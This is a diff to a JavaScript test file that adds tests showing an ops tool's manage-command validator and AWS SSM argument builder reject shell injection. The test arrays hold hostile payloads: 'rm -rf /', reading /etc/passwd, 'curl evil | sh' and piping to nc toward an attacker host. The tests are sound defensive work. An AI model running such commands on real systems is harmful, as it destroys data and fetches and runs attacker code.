@@ -29,6 +29,15 @@ import {
   buildSsmSendCommandArgs,
   buildRunManageArgs,
   buildPoolConfig,
+  DEFAULT_GITHUB_REPO,
+  BASE_AMI_TYPES,
+  PROMOTE_AMI_REF,
+  GCE_IMAGE_TYPES,
+  PROMOTE_GCE_IMAGE_REF,
+  buildGhWorkflowRunArgs,
+  resolveGhToken,
+  ghExec,
+  resolveGitRef,
 } from "./lib.js";
 
 // ---------------------------------------------------------------------------
@@ -475,6 +484,47 @@ describe("validateManageCommand", () => {
     assert.throws(() => validateManageCommand("custom_thing"), /Unknown/);
     assert.throws(() => validateManageCommand("makemigrations"), /Unknown/);
   });
+
+  it("rejects an empty or whitespace-only command", () => {
+    assert.throws(() => validateManageCommand(""), /Empty/);
+    assert.throws(() => validateManageCommand("   "), /Empty/);
+  });
+
+  it("rejects shell-control syntax in any token (issue #1176)", () => {
+    const payloads = [
+      "check; rm -rf /",
+      "check && rm -rf /",
+      "check | cat /etc/passwd",
+      "check $(id)",
+      "check `id`",
+      "check > /tmp/out",
+      "check < /etc/passwd",
+      "check &",
+      "check --deploy; touch /tmp/pwn",
+      "check ;ls",
+      "check '; rm -rf /; echo '",
+      'check "quoted"',
+      "check #comment",
+      "check *",
+      "check\n; rm -rf /",
+    ];
+    for (const p of payloads) {
+      assert.throws(
+        () => validateManageCommand(p),
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(p)}`,
+      );
+    }
+  });
+
+  it("does not echo the rejected payload in the error message", () => {
+    try {
+      validateManageCommand("check; secret-token-value");
+      assert.fail("expected a throw");
+    } catch (e) {
+      assert.doesNotMatch(e.message, /secret-token-value/);
+    }
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -878,10 +928,10 @@ describe("buildSsmSendCommandArgs", () => {
 });
 
 describe("buildRunManageArgs", () => {
-  it("wraps the management command in docker-exec inside the SSM JSON parameters", () => {
+  it("renders the fixed docker-exec wrapper from validated argv", () => {
     const argv = buildRunManageArgs({
       targetId: "i-deadbeef",
-      command: "showmigrations",
+      commandParts: ["showmigrations"],
     });
     assert.equal(argv[0], "ssm");
     assert.equal(argv[1], "send-command");
@@ -893,21 +943,92 @@ describe("buildRunManageArgs", () => {
     });
   });
 
-  it("preserves user metacharacters inside the docker-exec command (single argv element)", () => {
+  it("joins multi-token argv into the fixed wrapper", () => {
     const argv = buildRunManageArgs({
       targetId: "i-deadbeef",
-      command: "check; touch /tmp/pwn $(id)",
+      commandParts: ["check", "--deploy"],
     });
     const parameters = argv[argv.indexOf("--parameters") + 1];
-    const parsed = JSON.parse(parameters);
-    assert.deepEqual(parsed, {
-      commands: [
-        "docker exec portal python manage.py check; touch /tmp/pwn $(id)",
-      ],
+    assert.deepEqual(JSON.parse(parameters), {
+      commands: ["docker exec portal python manage.py check --deploy"],
     });
-    // The whole JSON payload is still one argv element — never split
-    // by spaces, never re-evaluated by the local shell.
-    assert.equal(typeof argv[argv.indexOf("--parameters") + 1], "string");
+  });
+
+  it("rejects any argv element carrying shell metacharacters (defense in depth)", () => {
+    const badParts = [
+      ["check", "$(id)"],
+      ["check", ";", "rm"],
+      ["check", "&&rm"],
+      ["check", "`id`"],
+      ["check", ">/tmp/x"],
+      ["check", "|cat"],
+      ["check", "a b"],
+    ];
+    for (const parts of badParts) {
+      assert.throws(
+        () => buildRunManageArgs({ targetId: "i-a", commandParts: parts }),
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(parts)}`,
+      );
+    }
+  });
+
+  it("rejects an empty or non-array argv", () => {
+    assert.throws(
+      () => buildRunManageArgs({ targetId: "i-a", commandParts: [] }),
+      /Empty/,
+    );
+    assert.throws(
+      () => buildRunManageArgs({ targetId: "i-a", commandParts: "check" }),
+      /Empty/,
+    );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// run_manage_command remote-shell injection resistance (issue #1176)
+//
+// The allowlist historically validated only the first whitespace-delimited
+// token, then the raw command string was concatenated into a
+// `docker exec ... manage.py <command>` invocation run by a *remote*
+// AWS-RunShellScript shell. These tests assert that the validate->render
+// pipeline rejects shell-control syntax before any SSM argv is built, and
+// that a benign command renders exactly the fixed wrapper.
+// ---------------------------------------------------------------------------
+describe("run_manage_command injection resistance (issue #1176)", () => {
+  const INJECTIONS = [
+    "check; rm -rf /",
+    "check && curl evil | sh",
+    "check $(id)",
+    "check `id`",
+    "showmigrations > /tmp/out",
+    "check | nc attacker 1",
+    "check\n; rm -rf /",
+    "check '; rm -rf /; echo '",
+  ];
+
+  it("rejects every injection payload before SSM argv is built", () => {
+    for (const payload of INJECTIONS) {
+      assert.throws(
+        () => {
+          const parts = validateManageCommand(payload);
+          buildRunManageArgs({ targetId: "i-a", commandParts: parts });
+        },
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(payload)}`,
+      );
+    }
+  });
+
+  it("emits only the fixed wrapper plus validated argv for a benign command", () => {
+    const parts = validateManageCommand("check --deploy");
+    const argv = buildRunManageArgs({ targetId: "i-a", commandParts: parts });
+    const parameters = argv[argv.indexOf("--parameters") + 1];
+    assert.deepEqual(JSON.parse(parameters).commands, [
+      "docker exec portal python manage.py check --deploy",
+    ]);
+    // No shell-control characters survive into the SSM parameters.
+    assert.doesNotMatch(parameters, /[;&|`$><]/);
   });
 });
 
@@ -1047,6 +1168,176 @@ describe("buildPoolConfig", () => {
     assert.throws(
       () => buildPoolConfig({ ...validArgs(), port: "5444" }),
       /port must be a positive integer/,
+    );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// GitHub workflow helpers (issue #411)
+// ---------------------------------------------------------------------------
+describe("buildGhWorkflowRunArgs", () => {
+  it("builds argv for gh workflow run with workflow inputs", () => {
+    assert.deepEqual(
+      buildGhWorkflowRunArgs({
+        workflow: "packer.yml",
+        repo: DEFAULT_GITHUB_REPO,
+        ref: "dev",
+        inputs: { ami_type: "kali" },
+      }),
+      [
+        "workflow",
+        "run",
+        "packer.yml",
+        "--repo",
+        DEFAULT_GITHUB_REPO,
+        "--ref",
+        "dev",
+        "-f",
+        "ami_type=kali",
+      ],
+    );
+  });
+
+  it("preserves metacharacters in input values as literal argv elements", () => {
+    const args = buildGhWorkflowRunArgs({
+      workflow: "packer.yml",
+      repo: DEFAULT_GITHUB_REPO,
+      ref: "feature/foo; rm -rf /",
+      inputs: { ami_type: "kali" },
+    });
+    assert.equal(args[args.indexOf("--ref") + 1], "feature/foo; rm -rf /");
+  });
+});
+
+describe("resolveGhToken", () => {
+  it("prefers GH_TOKEN over GITHUB_TOKEN", () => {
+    assert.equal(
+      resolveGhToken({ GH_TOKEN: "a", GITHUB_TOKEN: "b" }),
+      "a",
+    );
+  });
+
+  it("falls back to GITHUB_TOKEN", () => {
+    assert.equal(resolveGhToken({ GITHUB_TOKEN: "tok" }), "tok");
+  });
+
+  it("throws when no token is configured", () => {
+    assert.throws(() => resolveGhToken({}), /GitHub token not configured/);
+  });
+});
+
+describe("ghExec", () => {
+  it("invokes gh with token injected into the child env", () => {
+    const runner = makeRecordingRunner({ stdout: "ok\n" });
+    ghExec(["workflow", "run", "packer.yml"], {
+      runner,
+      token: "test-token",
+      env: { PATH: "/usr/bin" },
+    });
+    assert.equal(runner.calls.length, 1);
+    assert.deepEqual(runner.calls[0].argv, ["workflow", "run", "packer.yml"]);
+    assert.equal(runner.calls[0].options.env.GH_TOKEN, "test-token");
+    assert.equal(runner.calls[0].options.env.GITHUB_TOKEN, "test-token");
+  });
+
+  it("throws with stderr on non-zero exit", () => {
+    const runner = makeRecordingRunner({
+      status: 1,
+      stderr: "HTTP 403: forbidden",
+    });
+    assert.throws(
+      () =>
+        ghExec(["workflow", "run", "packer.yml"], {
+          runner,
+          token: "t",
+        }),
+      /HTTP 403: forbidden/,
+    );
+  });
+});
+
+describe("resolveGitRef", () => {
+  it("returns git branch when rev-parse succeeds", () => {
+    const calls = [];
+    const runner = (argv, options) => {
+      calls.push({ argv, options });
+      return {
+        status: 0,
+        stdout: "411-ops-mcp-ami\n",
+        stderr: "",
+        error: null,
+      };
+    };
+    assert.equal(resolveGitRef("/repo", { runner }), "411-ops-mcp-ami");
+    assert.deepEqual(calls[0].argv, ["rev-parse", "--abbrev-ref", "HEAD"]);
+    assert.equal(calls[0].options.cwd, "/repo");
+  });
+
+  it("falls back to dev when git fails", () => {
+    const runner = () => ({ status: 128, stdout: "", stderr: "fatal", error: null });
+    assert.equal(resolveGitRef("/repo", { runner, defaultRef: "dev" }), "dev");
+  });
+});
+
+describe("PROMOTE_AMI_REF", () => {
+  it("pins prod promotion to the protected integration branch", () => {
+    assert.equal(PROMOTE_AMI_REF, "dev");
+  });
+});
+
+describe("BASE_AMI_TYPES", () => {
+  it("matches packer-promote base AMI choices", () => {
+    assert.deepEqual([...BASE_AMI_TYPES], [
+      "kali",
+      "ubuntu",
+      "windows",
+      "dc",
+      "brokenbk",
+    ]);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// GCE image build/promote helpers (issue #505, PLAT-001.10)
+// ---------------------------------------------------------------------------
+describe("GCE_IMAGE_TYPES", () => {
+  it("matches the packer-gcp.yml image_type choices", () => {
+    assert.deepEqual([...GCE_IMAGE_TYPES], [
+      "ubuntu",
+      "brokenbk",
+      "kali",
+      "windows",
+      "dc",
+    ]);
+  });
+});
+
+describe("PROMOTE_GCE_IMAGE_REF", () => {
+  it("pins prod GCE promotion to the protected integration branch", () => {
+    assert.equal(PROMOTE_GCE_IMAGE_REF, "dev");
+  });
+});
+
+describe("buildGhWorkflowRunArgs for GCE image builds", () => {
+  it("targets packer-gcp.yml with the image_type input", () => {
+    assert.deepEqual(
+      buildGhWorkflowRunArgs({
+        workflow: "packer-gcp.yml",
+        repo: DEFAULT_GITHUB_REPO,
+        ref: "dev",
+        inputs: { image_type: "ubuntu" },
+      }),
+      [
+        "workflow",
+        "run",
+        "packer-gcp.yml",
+        "--repo",
+        DEFAULT_GITHUB_REPO,
+        "--ref",
+        "dev",
+        "-f",
+        "image_type=ubuntu",
+      ],
     );
   });
 });
